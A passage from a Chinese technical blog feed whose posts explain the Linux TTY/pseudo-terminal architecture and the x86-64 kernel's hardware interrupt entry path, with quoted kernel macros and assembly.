href="https://www.giantbranch.cn/2020/01/05/QEMU%20%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8AQOM%28Qemu%20Object%20Model%29%E7%9A%84%E9%83%A8%E5%88%86%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/">QEMU 的一些基础知识及QOM(Qemu Object Model)的部分相关源码阅读</a></li><li><a href="https://martins3.github.io/qemu/qom.html">QEMU 中的面向对象 : QOM</a></li><li><a href="https://www.binss.me/blog/qemu-note-of-qemu-object-model/">QEMU学习笔记——QOM(Qemu Object Model)</a></li><li><a href="https://ctf-wiki.org/pwn/virtualization/qemu/environment/build-qemu-dev/#qemu">编写 QEMU 模拟设备</a></li><li><a href="https://people.redhat.com/~thuth/blog/qemu/2018/09/10/instance-init-realize.html">QEMU’s instance_init() vs. realize()</a></li><li><a href="https://blog.csdn.net/lwhuq/article/details/98642184">QEMU(1) - QOM</a></li><li><a href="https://juejin.cn/post/6844903845550620685">浅谈QEMU的对象系统 </a></li><li><a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2018/09/05/qom-property">QOM Property</a></li><li><a href="https://www.linux-kvm.org/images/9/90/Kvmforum14-qom.pdf">QOM exegesis and apocalypse</a></li><li><a href="https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2015/09/26/qemu-options">QEMU参数解析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux终端</title>
      <link href="/2023/09/21/Linux%E7%BB%88%E7%AB%AF/"/>
      <url>/2023/09/21/Linux%E7%BB%88%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前就对TTY、PTY和PTS等概念比较迷惑，但因为知识储备问题并没有细究。最近刚好看到几篇相关的文章，觉得讲的非常不错，打算整理一下。</p><h1 id="终端架构"><a href="#终端架构" class="headerlink" title="终端架构"></a>终端架构</h1><p>目前Linux中终端的整体架构如下所示</p><p><img src="整体架构图.png" alt="Linux终端架构"></p><p>其基本的工作流程如下所示：</p><ol><li>终端模拟器(Terminal Emulator)打开<code>/dev/ptmx</code>(pseudo terminal master multiplexer)设备，分配一个可用的ptm(pseudo terminal master)设备的文件描述符。如<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/drivers/tty/pty.c#L824-L849">ptmx_open()</a>所示，Linux内核在打开ptm设备时，也会自动的创建一个pts(pseudo terminal slave)设备，与该ptm一一对应。</li><li>终端模拟器<code>fork()</code>子进程。子进程打开之前ptm设备对应的pts设备，并使用<code>dup()</code>将打开的pts设备的文件描述符设备为子进程的标准输入、标准输出和标准错误输出。</li><li>子进程执行<strong>bash</strong>程序。此时，<strong>bash</strong>和终端模拟器通过伪终端(pty, pseudo terminal)进行通信，即终端模拟器通过ptm设备读取的数据是<strong>bash</strong>通过pts设备写入的数据，而<strong>bash</strong>通过pts设备读取的数据是终端模拟器通过ptm设备写入的数据。</li></ol><h1 id="发展历史"><a href="#发展历史" class="headerlink" title="发展历史"></a>发展历史</h1><p>初看整个终端架构，大部分人都会觉得其过于复杂。为什么要引入pty概念呢，不能通过内核中的管道等机制实现终端模拟器和<strong>bash</strong>的通信吗？<br>实际上，这个架构的形成是因为Linux内核需要保持对早期终端设备的兼容性，整个终端设备的发展历史如下所示：</p><h2 id="电传打字机"><a href="#电传打字机" class="headerlink" title="电传打字机"></a>电传打字机</h2><p>电传打字机(Teletype, tty)是早期的计算机输入输出设备，如<img src="电传打字机.jpg" alt="借用Waynerv大佬的图">所示。</p><p>那时候因为计算机很昂贵，所以不存在个人电脑一说，都是服务器-终端架构(类似于现在的云电脑，属于是殊途同归了)。即电传打字机通过两条线缆连接到计算机的UART(Universal Asynchronous Receiver and Transmitter)接口，一条线缆传输电传打字机键盘输入的信息到服务器，一条线缆传输服务器的输出信号到电传打字机，整个系统架构如<img src="tty整体架构图.png" alt="tty整体架构提">所示。</p><p>整个UART驱动、Line Discipline模块和TTY驱动共同组成了一个TTY，其整体工作流程如下所示</p><ol><li>在电传打字机上按下按钮并产生电信号，电信号会通过线缆传送到服务器</li><li>服务器的UART驱动会将电缆传送的电信号转换为ASCII字符并交给Line Discipline模块处理</li><li>如<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/drivers/tty/n_tty.c#L1592-L1631">__receive_buf()</a>所示，Line Discipline模块会缓存所有的ASCII字符并解析特殊字符，一直等到遇到指定字符(^M, ^Z, ^C…)才会将相关数据或信号传递给tty core驱动或者TTY进程组</li><li>tty core驱动将Line Discipine模块传递的数据通过标准输入传递给程序处理</li><li>程序将要输出的数据写入到标准输出中，传递到tty core驱动</li><li>tty core驱动将程序输出的数据写入到Line Discipline模块的临时缓冲区，然后传递给UART驱动进行处理</li><li>UART驱动会将Line Discipline模块传递的数据，转换为电信号并通过线缆传送到电传打字机</li></ol><p>可以看到，在这个时期，这个架构是比较合理的。而内核为了保持对这个时期终端设备的兼容性，这个架构的很多组件在现有的架构中仍然被保留了下来。</p><h2 id="虚拟控制台"><a href="#虚拟控制台" class="headerlink" title="虚拟控制台"></a>虚拟控制台</h2><p><img src="虚拟控制台.png" alt="Linux虚拟控制台"><br>随着时代的发展，个人电脑蓬勃发展，显示器和键盘成为计算机主流的输入输出设备，UART和电传打字机已经不复存在。为了在保持兼容性的基础上适应时代变化，Linu内核通过软件实现模拟出vt(虚拟控制台，没有什么问题是多加一个抽象层不能解决的)，并将计算机连接的键盘和显示器作为虚拟控制台实际的输入输出即可，其架构如<img src="虚拟控制台架构.png" alt="虚拟控制台架构">所示</p><p>可以看到，和电传打字机时期的终端架构没什么太大的变化，仅仅是将硬件的电传打字机终端通过内核模块进行软件抽象而已。</p><h2 id="伪终端"><a href="#伪终端" class="headerlink" title="伪终端"></a>伪终端</h2><p>虽然Linux通过内核的虚拟控制台实现了对终端硬件设备的模拟，但是虚拟控制台仍然无法适应如下的许多场景：</p><ol><li>用户希望使用由用户实现的终端模拟程序，以拓展终端的功能，比如界面美化等功能。</li><li>用户希望实现通过网络访问远程主机上的面向终端的程序(如<code>vi</code>等)。这些程序需要执行一些面向终端的操作，如通过termios接口设置终端的<code>icanon</code>等设置，从而实现终端对前台job的控制等。因此无法简单通过管道等机制进行通信，需要某种机制能接入当前的tty系统。</li></ol><p>因此，为了在保持兼容性的前提下，满足如上的需求，则产生了最开头介绍的架构，如<img src="整体架构图.png" alt="伪终端架构">所示。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://waynerv.com/posts/how-tty-system-works/">Unix 终端系统（TTY）是如何工作的</a></li><li><a href="https://ytcoode.io/article/到底什么是标准输入输出/index.html">到底什么是标准输入输出</a></li><li><a href="http://www.wowotech.net/tty_framework/application_view.html">Linux TTY framework(3)_从应用的角度看TTY设备</a></li><li><a href="https://www.cnblogs.com/zzdyyy/p/7538077.html">Linux 的伪终端的基本原理 及其在远程登录（SSH，telnet等）中的应用</a></li><li><a href="https://www.kawabangga.com/posts/4515">TTY 到底是什么？</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux内核硬中断分析</title>
      <link href="/2023/08/23/linux%E5%86%85%E6%A0%B8%E7%A1%AC%E4%B8%AD%E6%96%AD%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/23/linux%E5%86%85%E6%A0%B8%E7%A1%AC%E4%B8%AD%E6%96%AD%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近几天的面试刚好问到了内核中断子系统的相关问题，发现自己对这部分了解的不是非常清晰，因此面试后就读了读<a href="https://github.com/torvalds/linux/tree/2ccdd1b13c591d306f0401d98dedc4bdcd02b421">Linux 6.5-rc6</a>相关代码。结果发现这部分的代码逻辑并不是非常清楚，所以记录下这篇博客，帮助梳理一下Linux内核的x86-64架构的中断子系统的硬中断部分的逻辑，方便以后快速查阅这部分代码细节。</p><p>整个内核中断子系统，简单可以分为<strong>上半部(硬中断)</strong>和<strong>下半部</strong>。上半部中断可以理解为从CPU被中断到CPU从中断栈中退出的部分，一般处理一些中断任务中非常紧急的工作；其余工作会推迟到下半部中断，包括<strong>softirq</strong>、<strong>tasklet</strong>和<strong>workqueue</strong>等。</p><p>这篇文章主要分析<strong>上半部</strong>中断，也就是<strong>硬中断</strong>。</p><h1 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h1><p>硬件中断整体流程如<img src="硬中断整体流程图.png" alt="硬件中断整体流程图">所示，整体可以分为硬件保存/恢复现场，保存/恢复上下文等步骤。</p><h1 id="硬件保存-恢复现场"><a href="#硬件保存-恢复现场" class="headerlink" title="硬件保存/恢复现场"></a>硬件保存/恢复现场</h1><p>这部分实际上完全是硬件的工作，我们阅读<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html">Intel® 64 and IA-32 Architectures Software Developer’s Manual 3A</a>手册的<strong>6.12 EXCEPTION AND INTERRUPT HANDLING</strong>章节即可。</p><p>对于保存现场来说，硬件主要做了如下工作</p><ol><li>如果从用户态中断，切换到CPU对应的<strong>trampoline栈</strong>上。该中断栈地址存储在<strong>TSS</strong>的<strong>sp0</strong>或<strong>IST</strong>中，分别在<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/kernel/cpu/common.c#L2263">cpu_init()</a>和<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/kernel/cpu/common.c#L2204">cpu_init_exception_handling()</a>中初始化。</li><li>将现场(即<strong>SS</strong>、<strong>RSP</strong>、<strong>RFLAGS</strong>、<strong>CS</strong>、<strong>RIP</strong>和<strong>Error Code</strong>)保存在<strong>当前栈</strong>上，如<img src="保存现场.png" alt="用户态和内核态中断下保存现场示意图">所示</li></ol><p>根据中断信号的向量号，从<img src="IDTR与IDT.png" alt="IDT">中查找对应的中断处理函数并执行即可。<strong>IDT</strong>分多次设置，但原理是类似的，如<a href="https://github.com/torvalds/linux/blob/master/arch/x86/kernel/idt.c#L226">idt_setup_traps()</a>所示。</p><p>对于恢复现场来说，基本是保存现场的逆操作，这里就不赘述了。</p><h1 id="中断入口声明-定义"><a href="#中断入口声明-定义" class="headerlink" title="中断入口声明/定义"></a>中断入口声明/定义</h1><p>前面分析到，CPU会从<strong>IDT</strong>中找到中断信号对应的<strong>中断门</strong>，然后执行其中中断处理函数。而这个中断处理函数的定义和声明非常的不直观，这里分析一下，方便以后阅读代码细节。</p><h2 id="中断门"><a href="#中断门" class="headerlink" title="中断门"></a>中断门</h2><p>一般中断门使用<strong>INTG</strong>宏进行定义，如<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/kernel/idt.c#L84">Divide Error</a>所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arch/x86/kernel/idt.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> G(_vector, _addr, _ist, _type, _dpl, _segment)\</span></span><br><span class="line"><span class="meta">&#123;\</span></span><br><span class="line"><span class="meta">.vector= _vector,\</span></span><br><span class="line"><span class="meta">.bits.ist= _ist,\</span></span><br><span class="line"><span class="meta">.bits.type= _type,\</span></span><br><span class="line"><span class="meta">.bits.dpl= _dpl,\</span></span><br><span class="line"><span class="meta">.bits.p= 1,\</span></span><br><span class="line"><span class="meta">.addr= _addr,\</span></span><br><span class="line"><span class="meta">.segment= _segment,\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Interrupt gate */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTG(_vector, _addr)\</span></span><br><span class="line"><span class="meta">G(_vector, _addr, DEFAULT_STACK, GATE_INTERRUPT, DPL0, __KERNEL_CS)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> __initconst <span class="class"><span class="keyword">struct</span> <span class="title">idt_data</span> <span class="title">def_idts</span>[] =</span> &#123;</span><br><span class="line">INTG(X86_TRAP_DE,asm_exc_divide_error),</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因此，为了分析中断的具体处理逻辑， 我们需要知道<strong>INTG</strong>的中断处理函数的定义信息。</p><h2 id="中断处理函数"><a href="#中断处理函数" class="headerlink" title="中断处理函数"></a>中断处理函数</h2><p>实际上，Linux内核中，中断处理函数的声明和部分定义，都在<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h">arch/x86/include/asm/idtentry.h</a>中，感觉有一点点tricky。</p><p>整个部分是通过<strong><strong>ASSEMBLY</strong></strong>宏实现的。</p><p>因为中断处理函数包含多层wrapper，并且中间wrapper大部分都是C语言的，因此在<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h">arch/x86/include/asm/idtentry.h</a>中用<code>#ifndef __ASSEMBLY__</code>范围的<code>DECLARE_IDTENTRY</code>宏来声明中断处理函数的所有wrapper。</p><p>而中断处理函数的最外层用于保存/恢复上下文，需要汇编实现，因此在<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h">arch/x86/include/asm/idtentry.h</a>中使用<code>#ifdef __ASSEMBLY__</code>范围的<code>DECLARE_IDTENTRY</code>宏来定义中断处理函数的最外层。其余部分的定义，可以使用C语言进行实现，则使用<code>#ifndef __ASSEMBLY__</code>范围的<code>DEFINE_IDTENTRY</code>宏来定义。</p><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>在Linux内核静态定义了<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h#L545-L699">符号</a>，但是解析的宏是<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h#L10-L408">#ifndef <strong>ASSEMBLY</strong></a>范围的<code>DECLARE_IDTENTRY</code>，主要如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DECLARE_IDTENTRY - Declare functions for simple IDT entry points</span></span><br><span class="line"><span class="comment"> *      No error code pushed by hardware</span></span><br><span class="line"><span class="comment"> * @vector:Vector number (ignored for C)</span></span><br><span class="line"><span class="comment"> * @func:Function name of the entry point</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Declares three functions:</span></span><br><span class="line"><span class="comment"> * - The ASM entry point: asm_##func</span></span><br><span class="line"><span class="comment"> * - The XEN PV trap entry point: xen_##func (maybe unused)</span></span><br><span class="line"><span class="comment"> * - The C handler called from the ASM entry point</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note: This is the C variant of DECLARE_IDTENTRY(). As the name says it</span></span><br><span class="line"><span class="comment"> * declares the entry points for usage in C code. There is an ASM variant</span></span><br><span class="line"><span class="comment"> * as well which is used to emit the entry stubs in entry_32/64.S.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_IDTENTRY(vector, func)\</span></span><br><span class="line"><span class="meta">asmlinkage void asm_##func(void);\</span></span><br><span class="line"><span class="meta">asmlinkage void xen_asm_##func(void);\</span></span><br><span class="line"><span class="meta">__visible void func(struct pt_regs *regs)</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>在这些静态<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h#L545-L699">符号</a>中，还有一些其他的宏，但基本都是<code>DECLARE_IDTENTRY</code>的包装，主要声明<code>asm_##func</code>，<code>xen_asm_##func</code>和<code>func</code>三个wrapper。根据注释和前面的<strong>中断门</strong>分析可知，中断处理函数应当以<code>asm_##func</code>汇编函数为入口，在<code>asm_##func</code>汇编函数中还会调用<code>func</code>C语言函数。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>前面分析了中断函数的声明，这里再看看这些函数是如何定义的，这才是我们最关心的。</p><ol><li><p>对于最外层wrapper的定义，即<code>asm_##func</code>的定义，仍然在Linux内核静态定义的<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h#L545-L699">符号</a>，但是解析的宏是<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h#L408-L529">#ifdef <strong>ASSEMBLY</strong></a>范围的<code>DECLARE_IDTENTRY</code>宏，主要如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The ASM variants for DECLARE_IDTENTRY*() which emit the ASM entry stubs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DECLARE_IDTENTRY(vector, func)\</span></span><br><span class="line"><span class="meta">idtentry vector asm_##func func has_error_code=0</span></span><br></pre></td></tr></table></figure><p>而<code>idtentry</code>宏实际上是定义在<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/entry/entry_64.S">arch/x86/entry/entry_64.S</a>的汇编宏，主要用于<strong>保存/恢复上下文</strong>工作并调用对应的wrapper，在后面部分介绍。</p></li><li><p>对于其余的wrapper的定义，即<code>func</code>，解析的宏是<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/idtentry.h#L10-L408">#ifndef <strong>ASSEMBLY</strong></a>范围的<code>DEFINE_IDTENTRY</code>宏，主要如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DEFINE_IDTENTRY - Emit code for simple IDT entry points</span></span><br><span class="line"><span class="comment"> * @func:Function name of the entry point</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @func is called from ASM entry code with interrupts disabled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The macro is written so it acts as function definition. Append the</span></span><br><span class="line"><span class="comment"> * body with a pair of curly brackets.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * irqentry_enter() contains common code which has to be invoked before</span></span><br><span class="line"><span class="comment"> * arbitrary code in the body. irqentry_exit() contains common code</span></span><br><span class="line"><span class="comment"> * which has to run before returning to the low level assembly code.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_IDTENTRY(func)\</span></span><br><span class="line"><span class="meta">static __always_inline void __##func(struct pt_regs *regs);\</span></span><br><span class="line"><span class="meta">\</span></span><br><span class="line"><span class="meta">__visible noinstr void func(struct pt_regs *regs)\</span></span><br><span class="line"><span class="meta">&#123;\</span></span><br><span class="line"><span class="meta">irqentry_state_t state = irqentry_enter(regs);\</span></span><br><span class="line"><span class="meta">\</span></span><br><span class="line"><span class="meta">instrumentation_begin();\</span></span><br><span class="line"><span class="meta">__##func (regs);\</span></span><br><span class="line"><span class="meta">instrumentation_end();\</span></span><br><span class="line"><span class="meta">irqentry_exit(regs, state);\</span></span><br><span class="line"><span class="meta">&#125;\</span></span><br><span class="line"><span class="meta">\</span></span><br><span class="line"><span class="meta">static __always_inline void __##func(struct pt_regs *regs)</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="保存-恢复上下文"><a href="#保存-恢复上下文" class="headerlink" title="保存/恢复上下文"></a>保存/恢复上下文</h2><p>根据前面的分析，最后中断处理函数的入口点是<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/entry/entry_64.S#L373-L419">idtentry</a>宏定义的函数，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * idtentry_body - Macro to emit code calling the C function</span></span><br><span class="line"><span class="comment"> * @cfunc:C function to be called</span></span><br><span class="line"><span class="comment"> * @has_error_code:Hardware pushed error code on stack</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">.macro idtentry_body cfunc has_error_code:req</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Call error_entry() and switch to the task stack if from userspace.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * When in XENPV, it is already in the task stack, and it can&#x27;t fault</span></span><br><span class="line"><span class="comment"> * for native_iret() nor native_load_gs_index() since XENPV uses its</span></span><br><span class="line"><span class="comment"> * own pvops for IRET and load_gs_index().  And it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment"> * switch the CR3.  So it can skip invoking error_entry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ALTERNATIVE <span class="string">&quot;call error_entry; movq %rax, %rsp&quot;</span>, \</span><br><span class="line">    <span class="string">&quot;call xen_error_entry&quot;</span>, X86_FEATURE_XENPV</span><br><span class="line"></span><br><span class="line">ENCODE_FRAME_POINTER</span><br><span class="line">UNWIND_HINT_REGS</span><br><span class="line"></span><br><span class="line">movq%rsp, %rdi<span class="comment">/* pt_regs pointer into 1st argument*/</span></span><br><span class="line"></span><br><span class="line">.<span class="keyword">if</span> \has_error_code == <span class="number">1</span></span><br><span class="line">movqORIG_RAX(%rsp), %rsi<span class="comment">/* get error code into 2nd argument*/</span></span><br><span class="line">movq$<span class="number">-1</span>, ORIG_RAX(%rsp)<span class="comment">/* no syscall to restart */</span></span><br><span class="line">.endif</span><br><span class="line"></span><br><span class="line">call\cfunc</span><br><span class="line"></span><br><span class="line"><span class="comment">/* For some configurations \cfunc ends up being a noreturn. */</span></span><br><span class="line">REACHABLE</span><br><span class="line"></span><br><span class="line">jmperror_return</span><br><span class="line">.endm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * idtentry - Macro to generate entry stubs for simple IDT entries</span></span><br><span class="line"><span class="comment"> * @vector:Vector number</span></span><br><span class="line"><span class="comment"> * @asmsym:ASM symbol for the entry point</span></span><br><span class="line"><span class="comment"> * @cfunc:C function to be called</span></span><br><span class="line"><span class="comment"> * @has_error_code:Hardware pushed error code on stack</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The macro emits code to set up the kernel context for straight forward</span></span><br><span class="line"><span class="comment"> * and simple IDT entries. No IST stack, no paranoid entry checks.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">.macro idtentry <span class="built_in">vector</span> asmsym cfunc has_error_code:req</span><br><span class="line">SYM_CODE_START(\asmsym)</span><br><span class="line"></span><br><span class="line">.<span class="keyword">if</span> \<span class="built_in">vector</span> == X86_TRAP_BP</span><br><span class="line"><span class="comment">/* #BP advances %rip to the next instruction */</span></span><br><span class="line">UNWIND_HINT_IRET_ENTRY offset=\has_error_code*<span class="number">8</span> signal=<span class="number">0</span></span><br><span class="line">.<span class="keyword">else</span></span><br><span class="line">UNWIND_HINT_IRET_ENTRY offset=\has_error_code*<span class="number">8</span></span><br><span class="line">.endif</span><br><span class="line"></span><br><span class="line">ENDBR</span><br><span class="line">ASM_CLAC</span><br><span class="line">cld</span><br><span class="line"></span><br><span class="line">.<span class="keyword">if</span> \has_error_code == <span class="number">0</span></span><br><span class="line">pushq$<span class="number">-1</span><span class="comment">/* ORIG_RAX: no syscall to restart */</span></span><br><span class="line">.endif</span><br><span class="line"></span><br><span class="line">.<span class="keyword">if</span> \<span class="built_in">vector</span> == X86_TRAP_BP</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If coming from kernel space, create a 6-word gap to allow the</span></span><br><span class="line"><span class="comment"> * int3 handler to emulate a call instruction.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">testb$<span class="number">3</span>, CS-ORIG_RAX(%rsp)</span><br><span class="line">jnz.Lfrom_usermode_no_gap_\@</span><br><span class="line">.rept<span class="number">6</span></span><br><span class="line">pushq<span class="number">5</span>*<span class="number">8</span>(%rsp)</span><br><span class="line">.endr</span><br><span class="line">UNWIND_HINT_IRET_REGS offset=<span class="number">8</span></span><br><span class="line">.Lfrom_usermode_no_gap_\@:</span><br><span class="line">.endif</span><br><span class="line"></span><br><span class="line">idtentry_body \cfunc \has_error_code</span><br><span class="line"></span><br><span class="line">_ASM_NOKPROBE(\asmsym)</span><br><span class="line">SYM_CODE_END(\asmsym)</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure></p><p>到这里，剩下的代码就非常容易分析了，这里主要分析一下保存/恢复上下文的代码，即<code>idtentry_body</code>和<code>error_entry</code>逻辑</p><ol><li>在当前栈上构造<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/ptrace.h">struct pt_regs</a>结构体</li><li>如果从用户态中断，将<strong>trampoline栈</strong>上的<code>struct pt_regs</code>移动到内核栈上，并切换到内核栈上</li></ol><p>总的来说，最后的效果是，将新的<a href="https://github.com/torvalds/linux/blob/2ccdd1b13c591d306f0401d98dedc4bdcd02b421/arch/x86/include/asm/ptrace.h">struct 